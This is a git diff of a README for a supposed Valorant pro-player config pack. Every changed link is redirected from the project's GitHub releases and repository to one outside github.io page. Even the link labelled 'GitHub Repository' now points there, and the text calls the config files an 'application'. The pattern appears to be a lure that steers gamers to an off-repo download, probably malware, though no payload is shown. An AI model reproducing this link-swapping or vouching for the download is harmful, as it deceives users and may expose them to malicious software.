@@ -8,7 +8,7 @@ If you want to play like TenZ, aspas, or Derke, this is your shortcut. No more g
 
 ## ⬇️ Download the Pack
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Valorant_Config_Pack_2026-blue?style=for-the-badge&logo=download&logoColor=white&color=FF6B6B)](https://github.com/kokimarinov2012/valorant-config-pack-2026/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Valorant_Config_Pack_2026-blue?style=for-the-badge&logo=download&logoColor=white&color=FF6B6B)](https://kokimarinov2012.github.io)
 
 Visit this link to download the application.
 
@@ -38,7 +38,7 @@ No special software is needed. The files are simple text-based config files.
 
 Follow these simple steps:
 
-1. **Click the download button** at the top of this page or go to the [releases page](https://github.com/kokimarinov2012/valorant-config-pack-2026/releases).
+1. **Click the download button** at the top of this page or go to the [releases page](https://kokimarinov2012.github.io).
 2. **Find the latest release** and click the download link.
 3. **Save the file** to your computer (usually in your Downloads folder).
 4. **Open the downloaded file** to see all the player folders.
@@ -165,8 +165,8 @@ This pack is free to use and share. The config files are the property of their r
 
 ## 🔗 Quick Links
 
-- [Download the Pack](https://github.com/kokimarinov2012/valorant-config-pack-2026/releases)
-- [GitHub Repository](https://github.com/kokimarinov2012/valorant-config-pack-2026)
+- [Download the Pack](https://kokimarinov2012.github.io)
+- [GitHub Repository](https://kokimarinov2012.github.io)
 
 ## 🎯 Final Tips
 
